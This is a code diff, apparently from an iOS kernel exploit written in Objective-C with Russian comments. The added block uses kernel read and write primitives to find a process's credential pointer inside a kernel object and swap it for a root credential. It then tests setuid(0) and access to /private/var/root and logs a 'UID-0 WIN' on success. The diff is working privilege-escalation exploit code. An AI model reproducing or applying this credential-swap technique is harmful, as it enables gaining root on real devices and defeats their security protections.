@@ -2693,6 +2693,46 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                 }
                 kpNote(r, [NSString stringWithFormat:@"  [W501] refs=%u", refHits]);
             }
+            // 2.0.66: дамп владельца ссылки + его соседей (кто держит таблицу)
+            {
+                uint64_t refVA = gW501RefVA;
+                uint64_t refPage = refVA & ~0x3fffULL;
+                uint64_t refPA = kvtophys(refPage);
+                int refT = refPA ? kpFrameTypeOf(refPA) : -1;
+                kpNote(r, [NSString stringWithFormat:@"  [W501] refpage=%#llx pa=%#llx t=%d",
+                          (unsigned long long)refPage, (unsigned long long)refPA, refT]);
+                NSMutableString *rd = [NSMutableString string];
+                for (int j = -4; j <= 4; j++)
+                    [rd appendFormat:@" %+x:%#018llx", j * 8, (unsigned long long)early_kread64(refVA + (uint64_t)j * 8)];
+                kpNote(r, [NSString stringWithFormat:@"  [W501] refctx:%@", rd]);
+                // ищем в этом объекте указатель на наш ucred/rootZVA
+                uint64_t scanBase = refVA >= 0x80 ? refVA - 0x80 : refVA;
+                for (uint32_t o = 0; o < 0x100; o += 8) {
+                    uint64_t q = kp_untag_ptr(early_kread64(scanBase + o));
+                    if (q == curUcred || q == rootZVA) {
+                        kpNote(r, [NSString stringWithFormat:@"  [W501] ★ refobj+%#x = %s %#llx (t=%d)",
+                                  o, q == curUcred ? @"curUcred" : @"rootZVA", (unsigned long long)q, refT]);
+                        if (refT == 0x21 && q == curUcred) {
+                            uint64_t sv = early_kread64(scanBase + o);
+                            early_kwrite64(scanBase + o, rootZVA);
+                            uint64_t rb = early_kread64(scanBase + o);
+                            uid_t u1 = getuid();
+                            int su = setuid(0);
+                            uid_t u2 = getuid();
+                            int fdR = open("/private/var/root", O_RDONLY);
+                            kpNote(r, [NSString stringWithFormat:@"  [W501] ref-swap readback=%#llx uid %u→%u setuid=%d open/root=%d",
+                                      (unsigned long long)rb, u1, u2, su, fdR]);
+                            if (fdR >= 0) close(fdR);
+                            if (u2 == 0) {
+                                kpNote(r, @"=== UID-0 WIN ★★★ ===");
+                            } else {
+                                early_kwrite64(scanBase + o, sv);
+                                kpNote(r, @"  [W501] ref-swap restored");
+                            }
+                        }
+                    }
+                }
+            }
             // пишем ВСЕ хиты на странице → 0, пробуем getuid + open системного файла
             uint64_t saved[16]; int nSaved = 0;
             uint64_t pageBase = firstHitVA - firstHitOff;
